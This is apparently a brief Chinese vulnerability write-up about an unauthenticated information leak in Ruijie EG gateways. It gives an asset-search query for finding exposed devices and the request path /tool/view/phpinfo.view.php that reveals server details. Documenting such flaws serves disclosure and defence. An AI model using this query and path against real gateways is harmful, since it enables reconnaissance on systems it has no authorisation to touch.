# 锐捷 EG易网关phpinfo.view.php 信息泄露漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷 EG易网关</font><font style="color:rgba(0, 0, 0, 0.9);">存在未经身份验证获取敏感信息</font>

**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">锐捷EG易网关</font>

**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(35, 41, 48);background-color:rgb(250, 250, 250);">app</font><font style="color:rgb(225, 0, 35);background-color:rgb(250, 250, 250);">=</font><font style="color:rgb(102, 153, 0);background-color:rgb(250, 250, 250);">"Ruijie-EG易网关"</font>

<font style="color:rgb(38, 38, 38);">●登录页面</font><font style="color:rgb(38, 38, 38);">  
</font>

![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/uLGTd_9BkwaR0Vvx/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-535279.webp)

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**<font style="color:rgb(38, 38, 38);"></font>

```plain
/tool/view/phpinfo.view.php
```

<font style="color:rgb(38, 38, 38);">  
</font>



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kehikp7lablbdsec>